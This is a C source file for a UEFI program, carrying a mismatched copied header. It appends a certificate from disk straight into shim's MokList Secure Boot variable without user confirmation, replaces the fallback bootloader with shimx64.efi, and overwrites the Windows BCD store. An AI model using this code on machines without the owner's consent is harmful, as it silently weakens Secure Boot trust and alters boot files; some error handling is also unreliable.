/*++

Copyright (c) Alex Ionescu.  All rights reserved.

Module Name:

	shvos.c

Abstract:

	This module implements the OS-facing UEFI stubs for SimpleVisor.

Author:

	Alex Ionescu (@aionescu) 29-Aug-2016 - Initial version

Environment:

	Kernel mode only.

--*/

//
// Basic UEFI Libraries
//
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
//#include <Guid/ImageAuthentication.h>  // Для gEfiCertX509Guid и связанных структур

// Boot and Runtime Services
//
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

//
// Shell Library
//
#include <Library/ShellLib.h>

// 
// Custom Driver Protocol 
// 
//#include "../UefiDriver/drvproto.h"
//EFI_GUID gEfiSampleDriverProtocolGuid = EFI_SAMPLE_DRIVER_PROTOCOL_GUID;

//
// We run on any UEFI Specification
//
extern CONST UINT32 _gUefiDriverRevision = 0;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "ShellSample";

EFI_STATUS
EFIAPI
UefiUnload(
	IN EFI_HANDLE ImageHandle
)
{
	// 
	// This code should be compiled out and never called 
	// 
	ASSERT(FALSE);
}

EFI_GUID SHIM_LOCK_GUID = { 0x605dab50, 0xe046, 0x4300, { 0xab, 0xb6, 0x3d, 0xd8, 0x10, 0xdd, 0x8b, 0x23 } };

EFI_GUID gEfiCertX509Guid = { 0xa5c059a1, 0x94e4, 0x4aa7, { 0x87, 0xb5, 0xab, 0x15, 0x5c, 0x2b, 0xf0, 0x72 } };
#define MAX_BYTES_TO_PRINT 100
#pragma pack(1)
typedef struct {
	///
	/// Type of the signature. GUID signature types are defined in below.
	///
	EFI_GUID    SignatureType;
	///
	/// Total size of the signature list, including this header.
	///
	UINT32      SignatureListSize;
	///
	/// Size of the signature header which precedes the array of signatures.
	///
	UINT32      SignatureHeaderSize;
	///
	/// Size of each signature.
	///
	UINT32      SignatureSize;
	///
	/// Header before the array of signatures. The format of this header is specified
	/// by the SignatureType.
	/// UINT8           SignatureHeader[SignatureHeaderSize];
	///
	/// An array of signatures. Each signature is SignatureSize bytes in length.
	/// EFI_SIGNATURE_DATA Signatures[][SignatureSize];
	///
} EFI_SIGNATURE_LIST;

typedef struct {
	///
	/// An identifier which identifies the agent which added the signature to the list.
	///
	EFI_GUID    SignatureOwner;
	///
	/// The format of the signature is defined by the SignatureType.
	///
	UINT8       SignatureData[0];
} EFI_SIGNATURE_DATA;

#pragma pack()


// функции удаления файла
EFI_STATUS DeleteFile(
	EFI_HANDLE ImageHandle,
	CHAR16* FilePath
) {
	EFI_STATUS Status;
	EFI_LOADED_IMAGE* FileSystem;
	EFI_HANDLE Device;
	EFI_FILE_IO_INTERFACE* Drive;
	EFI_FILE* Root, *File;

	// Доступ к файловой системе
	Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (void**)&FileSystem);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to get file system protocol: %r\n", Status);
		return Status;
	}
	Device = FileSystem->DeviceHandle;

	Status = gBS->HandleProtocol(Device, &gEfiSimpleFileSystemProtocolGuid, (void**)&Drive);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to access file system: %r\n", Status);
		return Status;
	}

	// Открытие корневого каталога
	Status = Drive->OpenVolume(Drive, &Root);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to open root directory: %r\n", Status);
		return Status;
	}

	// Открытие файла назначения
	Status = Root->Open(Root, &File, FilePath, EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
	if (EFI_ERROR(Status)) {
		if (Status == EFI_NOT_FOUND) {
			Print(L"File %s not found, nothing to delete.\n", FilePath);
		}
		else {
			Print(L"Failed to open file %s: %r\n", FilePath, Status);
		}
		return Status;
	}

	// Удаление файла
	Status = File->Delete(File);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to delete file %s: %r\n", FilePath, Status);
		return Status;
	}

	Print(L"File %s successfully deleted.\n", FilePath);
	return EFI_SUCCESS;
}

EFI_STATUS SaveMokListToFile(CHAR16 *FileName)
{
	EFI_STATUS Status;
	//EFI_FILE_PROTOCOL *Fs = NULL;
	EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FsProtocol = NULL;
	EFI_FILE_PROTOCOL *Root = NULL;
	EFI_FILE_PROTOCOL *File = NULL;

	UINTN DataSize = 0;
	VOID *Data = NULL;
	// Получить размер переменной MokList
	Status = gRT->GetVariable(
		L"MokList",
		&SHIM_LOCK_GUID,
		NULL,
		&DataSize,
		NULL
	);

	if (Status != EFI_BUFFER_TOO_SMALL) {
		Print(L"Failed to get MokList size, Status: %r\n", Status);
		return Status;
	}

	// Выделить память для переменной MokList
	Data = AllocatePool(DataSize);
	if (Data == NULL) {
		Print(L"Failed to allocate memory for MokList\n");
		return EFI_OUT_OF_RESOURCES;
	}

	// Получить данные переменной MokList
	Status = gRT->GetVariable(
		L"MokList",
		&SHIM_LOCK_GUID,
		NULL,
		&DataSize,
		Data
	);



	// Найти протокол файловой системы (fs0)
	Status = gBS->LocateProtocol(&gEfiSimpleFileSystemProtocolGuid, NULL, (VOID **)&FsProtocol);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to locate file system protocol, Status: %r\n", Status);
		FreePool(Data);
		return Status;
	}

	// Открыть корневой каталог файловой системы
	Status = FsProtocol->OpenVolume(FsProtocol, &Root);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to open volume, Status: %r\n", Status);
		FreePool(Data);
		return Status;
	}

	// Создать файл для записи (fs0:\MokList.bin)
	Status = Root->Open(
		Root,
		&File,
		FileName,
		EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ,
		0
	);

	if (EFI_ERROR(Status)) {
		Print(L"Failed to create file, Status: %r\n", Status);
		FreePool(Data);
		return Status;
	}

	// Записать данные переменной MokList в файл
	Status = File->Write(File, &DataSize, Data);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to write data to file, Status: %r\n", Status);
		File->Close(File);
		FreePool(Data);
		return Status;
	}

	Print(L"Successfully wrote MokList to fs0:\\MokList.bin\n");

	// Закрыть файл и освободить память
	File->Close(File);
	FreePool(Data);

	return EFI_SUCCESS;
}

//
// Функция для копирования файла.
//
EFI_STATUS CopyFile(
	EFI_HANDLE ImageHandle,
	CHAR16* SourcePath,
	CHAR16* DestinationPath
) {
	EFI_STATUS Status;
	EFI_LOADED_IMAGE* FileSystem;
	EFI_HANDLE Device;
	EFI_FILE_IO_INTERFACE* Drive;
	EFI_FILE* Root, *SourceFile, *DestinationFile;
	UINT8* Buffer;
	UINTN BufferSize;

	// Доступ к файловой системе
	Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (void**)&FileSystem);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to get file system protocol: %r\n", Status);
		return Status;
	}
	Device = FileSystem->DeviceHandle;

	Status = gBS->HandleProtocol(Device, &gEfiSimpleFileSystemProtocolGuid, (void**)&Drive);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to access file system: %r\n", Status);
		return Status;
	}

	// Открытие корневого каталога
	Status = Drive->OpenVolume(Drive, &Root);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to open root directory: %r\n", Status);
		return Status;
	}

	// Открытие исходного файла
	Status = Root->Open(Root, &SourceFile, SourcePath, EFI_FILE_MODE_READ, 0);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to open source file %s: %r\n", SourcePath, Status);
		return Status;
	}

	// Получение размера файла
	EFI_FILE_INFO* FileInfo;
	UINTN FileInfoSize = sizeof(EFI_FILE_INFO) + 200;
	FileInfo = AllocatePool(FileInfoSize);
	Status = SourceFile->GetInfo(SourceFile, &gEfiFileInfoGuid, &FileInfoSize, FileInfo);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to get file info: %r\n", Status);
		FreePool(FileInfo);
		SourceFile->Close(SourceFile);
		return Status;
	}

	BufferSize = FileInfo->FileSize;
	Buffer = AllocatePool(BufferSize);
	FreePool(FileInfo);

	// Чтение данных из исходного файла
	Status = SourceFile->Read(SourceFile, &BufferSize, Buffer);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to read source file: %r\n", Status);
		FreePool(Buffer);
		SourceFile->Close(SourceFile);
		return Status;
	}
	SourceFile->Close(SourceFile);

	// Создание и запись данных в целевой файл
	Status = Root->Open(Root, &DestinationFile, DestinationPath, EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ, 0);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to create destination file %s: %r\n", DestinationPath, Status);
		FreePool(Buffer);
		return Status;
	}

	Status = DestinationFile->Write(DestinationFile, &BufferSize, Buffer);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to write to destination file: %r\n", Status);
	}
	else {
		Print(L"File successfully copied to %s\n", DestinationPath);
	}

	FreePool(Buffer);
	DestinationFile->Close(DestinationFile);

	return Status;
}

// Функция для вывода первых байтов данных в виде HEX
void PrintHex(const UINT8* Data, UINTN DataSize) {
	UINTN PrintSize = (DataSize < MAX_BYTES_TO_PRINT) ? DataSize : MAX_BYTES_TO_PRINT;

	for (UINTN i = 0; i < PrintSize; i++) {
		Print(L"%02x ", Data[i]);
		if ((i + 1) % 16 == 0) {
			Print(L"\n");
		}
	}
	if (PrintSize % 16 != 0) {
		Print(L"\n");
	}
}

// Функция проверки переменной MOK
EFI_STATUS CheckingMOKlist() {

	EFI_STATUS Status;
	UINTN DataSize = 0;
	VOID *Data = NULL;
	CHAR16* MokListVariable = L"MokList";
	

	// Получаем размер переменной MokList
	Status = gRT->GetVariable(
		MokListVariable,
		&SHIM_LOCK_GUID,
		NULL,
		&DataSize,
		NULL
	);

	if (Status == EFI_BUFFER_TOO_SMALL) {
		// Выделяем память под данные
		Data = AllocateZeroPool(DataSize);
		if (Data == NULL) {
			Print(L"Error: Not enough memory for MokList\n");
			return EFI_OUT_OF_RESOURCES;
		}

		// Читаем переменную в выделенный буфер
		Status = gRT->GetVariable(
			MokListVariable,
			&SHIM_LOCK_GUID,
			NULL,
			&DataSize,
			Data
		);

		if (!EFI_ERROR(Status)) {
			Print(L"MokList found. Size: %u bytes\n", DataSize);
			Print(L"First %d bytes:\n", MAX_BYTES_TO_PRINT);
			PrintHex((UINT8*)Data, DataSize);
			SaveMokListToFile(L"MOKCheckingMOKlist.bin");
		}
		else {
			Print(L"Error reading MokList: %r\n", Status);
		}

		// Освобождаем память после использования
		FreePool(Data);
	}
	else if (Status == EFI_NOT_FOUND) {
		Print(L"MokList not found. MOK certificates are not installed.\n");
	}
	else {
		Print(L"Error retrieving MokList: %r\n", Status);
	}

	return EFI_SUCCESS;
}

EFI_STATUS
get_variable_attr(const CHAR16 * const var, UINT8 **data, UINTN *len,
	EFI_GUID owner, UINT32 *attributes)
{
	EFI_STATUS efi_status;

	if (!len)
		return EFI_INVALID_PARAMETER;

	*len = 0;

	efi_status = gRT->GetVariable((CHAR16 *)var, &owner, NULL, len, NULL);
	if (efi_status != EFI_BUFFER_TOO_SMALL) {
		if (!EFI_ERROR(efi_status)) /* this should never happen */
			return EFI_PROTOCOL_ERROR;
		return efi_status;
	}

	if (!data)
		return EFI_INVALID_PARAMETER;

	/*
	 * Add three zero pad bytes; at least one correctly aligned UCS-2
	 * character.
	 */
	*data = AllocateZeroPool(*len + 3);
	if (!*data)
		return EFI_OUT_OF_RESOURCES;

	efi_status = gRT->GetVariable((CHAR16 *)var, &owner, attributes, len, *data);
	if (EFI_ERROR(efi_status)) {
		FreePool(*data);
		*data = NULL;
	}

	return efi_status;
}


// Функция записи переменной MOK
EFI_STATUS WriteMokVariable(
	CHAR16 *VariableName,
	UINT8 *CertData,
	UINTN CertDataSize
) {
	EFI_STATUS efi_status = EFI_SUCCESS;
	EFI_SIGNATURE_LIST *CertList;
	EFI_SIGNATURE_DATA *SignatureData;
	UINTN MokBufferSize;
	void *MokBuffer = NULL;

	// Рассчитываем размер буфера для новой записи MOK
	MokBufferSize = CertDataSize + sizeof(EFI_SIGNATURE_LIST) + sizeof(EFI_SIGNATURE_DATA);
	
	MokBuffer = AllocateZeroPool(MokBufferSize);

	if (!MokBuffer) {
		return EFI_OUT_OF_RESOURCES;  // Ошибка выделения памяти
	}

	// Инициализация новой записи EFI_SIGNATURE_LIST
	CertList = (EFI_SIGNATURE_LIST *)MokBuffer;
	CertList->SignatureType = gEfiCertX509Guid;
	CertList->SignatureListSize = (UINT32)MokBufferSize;
	CertList->SignatureHeaderSize = 0;
	CertList->SignatureSize = (UINT32)(sizeof(EFI_GUID) + CertDataSize);

	// Указатель на EFI_SIGNATURE_DATA
	SignatureData = (EFI_SIGNATURE_DATA *)((UINT8 *)MokBuffer + sizeof(EFI_SIGNATURE_LIST));
	ZeroMem(&SignatureData->SignatureOwner, sizeof(EFI_GUID));
	SignatureData->SignatureOwner = SHIM_LOCK_GUID;  // Заполняем GUID владельца
	CopyMem(SignatureData->SignatureData, CertData, CertDataSize);  // Копируем данные сертификата


	// Обработка существующей переменной MokList
	void *OldData = NULL;
	void *NewData = NULL;
	UINTN OldSize = 0;
	UINTN NewSize = 0;
	UINT32 Attributes = 0;

	// Используем get_variable_attr для получения существующей переменной
	efi_status = get_variable_attr(VariableName, (UINT8 **)&OldData, &OldSize, SHIM_LOCK_GUID, &Attributes);
	if (EFI_ERROR(efi_status) && efi_status != EFI_NOT_FOUND) {
		goto out;  // Если произошла ошибка, кроме "переменная не найдена"
	}

	// Проверяем атрибуты существующей переменной
	if (Attributes & EFI_VARIABLE_RUNTIME_ACCESS) {
		if (OldData) {
			FreePool(OldData);
		}
		OldData = NULL;
		OldSize = 0;
	}

	// Рассчитываем новый размер переменной и объединяем старые данные с новой записью
	NewSize = OldSize + MokBufferSize;
	NewData = AllocateZeroPool(NewSize);
	if (!NewData) {
		efi_status = EFI_OUT_OF_RESOURCES;
		goto out;
	}

	if (OldData && OldSize > 0) {
		CopyMem(NewData, OldData, OldSize);
	}
	CopyMem((UINT8 *)NewData + OldSize, MokBuffer, MokBufferSize);

	

	// Записываем переменную
	efi_status = gRT->SetVariable(
		VariableName,
		&SHIM_LOCK_GUID,
		EFI_VARIABLE_NON_VOLATILE |
		EFI_VARIABLE_BOOTSERVICE_ACCESS,
		NewSize,
		NewData
	);

	//SaveMokListToFile(L"MOKWriteMokVariable.bin");
out:
	// Освобождаем выделенную память
	if (MokBuffer) {
		FreePool(MokBuffer);
	}
	if (OldData) {
		FreePool(OldData);
	}
	if (NewData) {
		FreePool(NewData);
	}

	return efi_status;
}



// Функция для чтения сертификата с диска
EFI_STATUS ReadCertificateFromDisk(
	EFI_HANDLE ImageHandle,
	CHAR16 *FilePath,
	UINT8 **Buffer,
	UINTN *BufferSize
) {
	EFI_STATUS Status;
	EFI_LOADED_IMAGE *FileSystem;
	//EFI_FILE_PROTOCOL *RootDir;
	//EFI_FILE_PROTOCOL *File;
	EFI_FILE_INFO *FileInfo;
	UINTN FileInfoSize = sizeof(EFI_FILE_INFO) + 200;
	EFI_HANDLE device;
	EFI_FILE_IO_INTERFACE *drive;
	EFI_FILE *root, *File;

	// Открытие файловой системы
	//Status = gBS->HandleProtocol(ImageHandle, &gEfiSimpleFileSystemProtocolGuid, (void**)&FileSystem);
	Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (void**)&FileSystem);
	if (EFI_ERROR(Status)) {
		Print(L"Failed Open the file system: %r\n", Status);
		return Status;
	}
	device = FileSystem->DeviceHandle;

	Status = gBS->HandleProtocol(device, &gEfiSimpleFileSystemProtocolGuid,
		(void **)&drive);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to find file system on the drive (netboot?): %r\n", Status);
	}

	// Открытие корневого каталога
	Status = drive->OpenVolume(drive, &root);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to open root directory: %r\n", Status);
		return Status;
	}

	// Открытие файла сертификата
	Status = root->Open(root, &File, FilePath, EFI_FILE_MODE_READ, 0);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to open file %s: %r\n", FilePath, Status);
		return Status;
	}

	// Получаем размер файла
	FileInfo = AllocatePool(FileInfoSize);
	Status = File->GetInfo(File, &gEfiFileInfoGuid, &FileInfoSize, FileInfo);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to get file info: %r\n", Status);
		FreePool(FileInfo);
		File->Close(File);
		return Status;
	}

	*BufferSize = FileInfo->FileSize;
	*Buffer = AllocatePool(*BufferSize);
	FreePool(FileInfo);

	// Читаем содержимое файла в буфер
	Status = File->Read(File, BufferSize, *Buffer);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to read file: %r\n", Status);
		FreePool(*Buffer);
		File->Close(File);
		return Status;
	}

	Print(L"File %s successfully read, size: %d bytes\n", FilePath, *BufferSize);
	File->Close(File);
	return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
UefiMain(
	IN EFI_HANDLE ImageHandle,
	IN EFI_SYSTEM_TABLE* SystemTable
)
{

	Print(L"Hello World! My handle is %lx and System Table is at %p\n",
		ImageHandle, SystemTable);

	// Указываем путь к сертификату
	CHAR16 *CertPath = L"\\EFI\\certs\\MOK.der";
	UINT8 *CertData;
	UINTN CertDataSize;

	// Чтение сертификата с диска
	EFI_STATUS Status = ReadCertificateFromDisk(ImageHandle, CertPath, &CertData, &CertDataSize);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to read certificate from disk: %r\n", Status);
		return Status;
	}

	// Запись сертификата в переменную MOK
	Status = WriteMokVariable(L"MokList", CertData, CertDataSize);
	if (EFI_ERROR(Status)) {
		Print(L"Failed to write certificate to MokList: %r\n", Status);
	}
	else {
		Print(L"Certificate successfully added to MokList.\n");
	}

	Status = CheckingMOKlist();

	// Освобождаем память
	FreePool(CertData);


	// Указываем пути исходного и целевого файлов для копирования
	CHAR16* SourcePathShimx = L"\\EFI\\ubuntu\\shimx64.efi";
	CHAR16* DestinationPathBootx = L"\\EFI\\Boot\\bootx64.efi";

	EFI_STATUS DeleteStatus = DeleteFile(ImageHandle, DestinationPathBootx);
	if (EFI_ERROR(DeleteStatus)) {
		Print(L"Failed to delete file: %r\n", DeleteStatus);
	}

	// Вызов функции копирования файла
	EFI_STATUS CopyStatus = CopyFile(ImageHandle, SourcePathShimx, DestinationPathBootx);
	if (EFI_ERROR(CopyStatus)) {
		Print(L"Failed to copy shimx64.efi: %r\n", CopyStatus);
	}

	// Указываем пути исходного и целевого файлов для копирования
	CHAR16* SourcePathBCDR = L"\\EFI\\Microsoft\\Boot\\BCDR";
	CHAR16* DestinationPathBCD = L"\\EFI\\Microsoft\\Boot\\BCD";

	DeleteStatus = DeleteFile(ImageHandle, DestinationPathBCD);
	if (EFI_ERROR(DeleteStatus)) {
		Print(L"Failed to delete file: %r\n", DeleteStatus);
	}

	// Вызов функции копирования файла
	CopyStatus = CopyFile(ImageHandle, SourcePathBCDR, DestinationPathBCD);
	if (EFI_ERROR(CopyStatus)) {
		Print(L"Failed to copy file: %r\n", CopyStatus);
	}

	// Перезагрузка системы
	//gRT->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);

	return Status;
}
